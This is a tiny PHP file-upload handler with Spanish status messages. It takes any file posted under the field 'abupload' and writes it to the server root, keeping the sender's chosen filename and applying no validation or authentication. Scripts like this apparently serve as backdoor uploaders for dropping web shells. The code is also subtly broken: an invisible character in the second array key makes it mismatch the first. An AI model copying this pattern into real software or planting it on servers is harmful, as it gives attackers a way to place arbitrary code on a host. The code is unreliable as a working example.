<?php

$target_path = "/";

$target_path = $target_path . basename( $_FILES['abupload']['name']); 

if(move_uploaded_file($_FILES['﻿abupload']['tmp_name'], $target_path)) {
    echo "Correcto :D";
} else{
    echo "Nope hubo un error";
}

?>